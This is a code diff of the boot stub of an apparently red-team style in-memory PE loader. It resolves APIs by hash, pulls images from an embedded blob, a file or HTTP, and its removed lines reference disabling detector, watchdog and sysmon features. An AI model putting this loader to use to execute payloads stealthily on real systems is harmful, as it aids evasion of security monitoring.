@@ -8,36 +8,22 @@
 #include "pe_loader.h"
 #include "boot.h"
 
-static errno loadOption(Runtime_Opts* options);
-static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);
-
+static void* loadImage(Runtime_M* runtime);
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
 static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
 
-errno Boot()
+errno Boot(void* ctx)
 {
     // initialize Gleam-RT for PE Loader
-    Runtime_Opts options = {
-        .BootInstAddress     = GetFuncAddr(&Boot),
-        .EnableSecurityMode  = false,
-        .DisableDetector     = false,
-        .DisableWatchdog     = false,
-        .DisableSysmon       = false,
-        .NotEraseInstruction = false,
-        .NotAdjustProtect    = false,
-        .TrackCurrentThread  = false,
-    };
-    errno elo = loadOption(&options);
-    if (elo != NO_ERROR)
-    {
-        return elo;
-    }
-    Runtime_M* runtime = InitRuntime(&options);
+    Runtime_M* runtime = InitRuntime(GetFuncAddr(&Boot), NULL);
     if (runtime == NULL)
     {
         return GetLastErrno();
     }
+
+    // reserved context and extended arguments
+    (void)ctx;
 
     // initialize PE Loader
     PELoader_M* loader = NULL;
@@ -45,40 +31,26 @@ errno Boot()
     for (;;)
     {
         // load PE Image, it cannot be empty
-        void* image; uint32 size;
-        if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &image, &size))
-        {
-            err = ERR_NOT_FOUND_PE_IMAGE;
-            break;
-        }
-        if (size == 0)
-        {
-            err = ERR_EMPTY_PE_IMAGE_DATA;
-            break;
-        }
-        image = loadImage(runtime, image, size);
+        void* image = loadImage(runtime);
         if (image == NULL)
         {
             err = GetLastErrno();
             break;
         }
         PELoader_Cfg config = {
-            .FindAPI = runtime->HashAPI.FindAPI,
+            .FindAPI = runtime->HashAPI.FindAPI_MA,
 
             .Image          = image,
             .CommandLineA   = NULL,
             .CommandLineW   = NULL,
-            .WaitMain       = false,
-            .AllowSkipDLL   = false,
-            .IgnoreStdIO    = true,
             .StdInput       = NULL,
             .StdOutput      = NULL,
             .StdError       = NULL,
+            .WaitMain       = false,
+            .AllowSkipDLL   = false,
+            .IgnoreStdIO    = true,
             .NotAutoRun     = false,
             .NotStopRuntime = false,
-
-            .NotEraseInstruction = options.NotEraseInstruction,
-            .NotAdjustProtect    = options.NotAdjustProtect,
         };
         loader = InitPELoader(runtime, &config);
         if (loader == NULL)
@@ -120,29 +92,20 @@ errno Boot()
     return err;
 }
 
-__declspec(noinline)
-static errno loadOption(Runtime_Opts* options)
+static void* loadImage(Runtime_M* runtime)
 {
-    uintptr stub = (uintptr)(GetFuncAddr(&Argument_Stub));
-    stub -= OPTION_STUB_SIZE;
-    // check runtime option stub is valid
-    if (*(byte*)stub != OPTION_STUB_MAGIC)
+    byte*  config = NULL;
+    uint32 size;
+    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config, &size))
     {
-        return ERR_INVALID_OPTION_STUB;
+        SetLastErrno(ERR_NOT_FOUND_PE_IMAGE);
+        return NULL;
     }
-    // load runtime options from stub
-    options->EnableSecurityMode  = *(bool*)(stub + OPT_OFFSET_ENABLE_SECURITY_MODE);
-    options->DisableDetector     = *(bool*)(stub + OPT_OFFSET_DISABLE_DETECTOR);
-    options->DisableWatchdog     = *(bool*)(stub + OPT_OFFSET_DISABLE_WATCHDOG);
-    options->DisableSysmon       = *(bool*)(stub + OPT_OFFSET_DISABLE_SYSMON);
-    options->NotEraseInstruction = *(bool*)(stub + OPT_OFFSET_NOT_ERASE_INSTRUCTION);
-    options->NotAdjustProtect    = *(bool*)(stub + OPT_OFFSET_NOT_ADJUST_PROTECT);
-    options->TrackCurrentThread  = *(bool*)(stub + OPT_OFFSET_TRACK_CURRENT_THREAD);
-    return NO_ERROR;
-}
-
-static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
-{
+    if (size == 0)
+    {
+        SetLastErrno(ERR_EMPTY_PE_IMAGE_DATA);
+        return NULL;
+    }
     if (size < 1)
     {
         SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
@@ -170,14 +133,7 @@ static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
     config++;
     switch (mode)
     {
-    case EMBED_DISABLE_COMPRESS:
-      {
-        uint32 size = *(uint32*)config;
-        void* buf = runtime->Memory.Alloc(size);
-        mem_copy(buf, config + 4, size);
-        return buf;
-      }
-    case EMBED_ENABLE_COMPRESS:
+    case EMBED_ENABLE_COMPRESSION:
       {
         uint32 rawSize = *(uint32*)(config+0);
         uint32 comSize = *(uint32*)(config+4);
@@ -189,6 +145,13 @@ static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
             SetLastErrno(ERR_INVALID_COMPRESS_DATA);
             return NULL;
         }
+        return buf;
+      }
+    case EMBED_DISABLE_COMPRESSION:
+      {
+        uint32 size = *(uint32*)config;
+        void* buf = runtime->Memory.Alloc(size);
+        mem_copy(buf, config + 4, size);
         return buf;
       }
     default:
